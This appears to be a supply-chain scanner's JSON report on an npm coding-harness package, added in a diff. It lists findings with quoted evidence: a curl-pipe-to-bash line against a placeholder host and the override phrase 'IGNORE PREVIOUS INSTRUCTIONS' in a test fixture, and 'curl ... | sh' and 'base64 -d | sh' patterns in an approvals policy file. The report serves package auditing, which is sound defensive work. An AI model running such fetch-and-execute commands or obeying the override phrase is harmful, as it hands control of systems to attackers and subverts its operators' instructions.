@@ -1,0 +1,97 @@
+{
+  "item": {
+    "source": "mcp-registry",
+    "ecosystem": "npm",
+    "name": "krusch-coding-harness",
+    "version": "0.2.2",
+    "download": null
+  },
+  "archive_sha256": "eb8acec22fd54cbbaf2ae9a9fa71b305afc5dc0f55d8e94d637d08ad2f873dd9",
+  "findings": [
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "package/test/fixtures/golden-trajectories-100.json",
+      "line": 1491,
+      "evidence": "curl -fsSL https://install.example.invalid/setup.sh | bash",
+      "file_sha256": "40d76bb6216bc60cd97dc2b86f8b8256a575fbe03f13a4da9f3930dcd0773832"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "package/test/fixtures/golden-trajectories-100.json",
+      "line": 10791,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "40d76bb6216bc60cd97dc2b86f8b8256a575fbe03f13a4da9f3930dcd0773832"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "package/src/approvals/policy-floor.js",
+      "line": 329,
+      "evidence": "curl ... | sh",
+      "file_sha256": "48b9b75ac32351bdecba65f352c4767a2c3207994f2a8c7d1afeb8cf8f0adf62"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "package/src/approvals/policy-floor.js",
+      "line": 102,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "48b9b75ac32351bdecba65f352c4767a2c3207994f2a8c7d1afeb8cf8f0adf62"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "addonaudit.com",
+      "file_sha256": null
+    },
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-PACKAGE",
+      "summary": "Package first published 6 day(s) ago",
+      "path": null,
+      "line": null,
+      "evidence": "2026-11-18T23:44:03.143Z",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "addonaudit.com",
+    "advisories.pkg-security.example",
+    "ctlog.cert-monitor.example",
+    "developer.payments-gateway.example",
+    "docs.sdk-registry.example",
+    "dolphinbench.ai",
+    "downloads.hardware-fw.example",
+    "evals.open-benchmarks.example",
+    "evil.example.com",
+    "example.com",
+    "filings.public-docket.example",
+    "generativelanguage.googleapis.com",
+    "github.com",
+    "hol.org",
+    "huggingface.co",
+    "img.shields.io",
+    "install.example.invalid",
+    "krusch.dev",
+    "openrouter.ai",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "static.modelcontextprotocol.io",
+    "status.cloud-vendor.example",
+    "tariffs.grid-utility.example",
+    "trust.enterprise-saas.example"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
